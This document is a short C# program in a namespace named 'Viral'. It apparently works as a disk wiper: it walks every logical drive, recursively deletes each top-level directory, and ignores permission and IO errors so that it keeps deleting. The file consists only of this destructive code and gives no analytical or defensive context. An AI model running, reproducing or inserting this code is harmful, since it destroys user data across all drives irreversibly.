using System;
using System.IO;

namespace Viral;

internal class Program
{
	private static void Main(string[] args)
	{
		string[] logicalDrives = Environment.GetLogicalDrives();
		for (int i = 0; i < logicalDrives.Length; i++)
		{
			try
			{
				Console.WriteLine(logicalDrives[i]);
				string path = logicalDrives[i];
				string[] directories = Directory.GetDirectories(path);
				for (int j = 0; j < directories.Length; j++)
				{
					Directory.Delete(directories[j], recursive: true);
				}
			}
			catch (Exception ex)
			{
				if (!(ex is UnauthorizedAccessException) && !(ex is IOException))
				{
					throw;
				}
			}
		}
	}
}
